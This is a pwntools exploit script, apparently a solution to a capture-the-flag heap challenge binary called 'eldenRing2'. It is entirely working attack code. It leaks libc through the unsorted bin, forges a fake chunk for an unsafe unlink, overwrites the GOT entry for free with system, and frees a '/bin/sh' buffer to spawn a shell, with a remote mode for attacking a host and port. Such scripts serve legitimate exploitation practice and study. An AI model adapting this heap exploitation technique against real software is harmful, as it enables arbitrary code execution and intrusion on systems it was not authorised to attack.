from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './eldenRing2'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'>', str(idx).encode())

def create(idx, sz):
    opt(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def edit(idx, content):
    opt(3)
    sla(b'Index: ', str(idx).encode())
    sa(b'Content: ', content)

def show(idx):
    opt(4)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    opt(2)
    sla(b'Index: ', str(idx).encode())

def exp():
    for i in range(12):
        create(i, 0xf8)
    
    # fulfill tecache and free chunk_7 to unsorted_bin
    for i in range(8):
        delete(i)

    # leak libc
    show(7)
    main_arena = u64(rl()[:-1].ljust(8, b'\x00')) - 96
    log.success(f'main_arena: {hex(main_arena)}')

    libc.address = main_arena - 0x1ecb80
    log.success(f'libc_base: {hex(libc.address)}')

    delete(10) # unsorted_bin->bk == chunk10

    # unlink
    addr_global_tbl = 0x4040C0 + 7*8
    fake_chunk_ptr = addr_global_tbl
    fake_fd = fake_chunk_ptr - 0x18
    fake_bk = fake_chunk_ptr - 0x10
    payload_unlink = flat({
        0x8:    0xf0,  # size | prev_inuse
        0x10:   fake_fd,
        0x18:   fake_bk,
        0xf0:   0xf0,   # nextchunk.prev_size
    })

    edit(7, payload_unlink)
    delete(8)

    # now the *fake_chunk_ptr = fake_chunk_ptr - 0x18
    def write_to(addr, val):
        edit(7, p64(addr))
        edit(4, p64(val))

    write_to(exe.got.free, libc.sym.system)

    pid_pause()
    edit(0, '/bin/sh')
    delete(0)

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()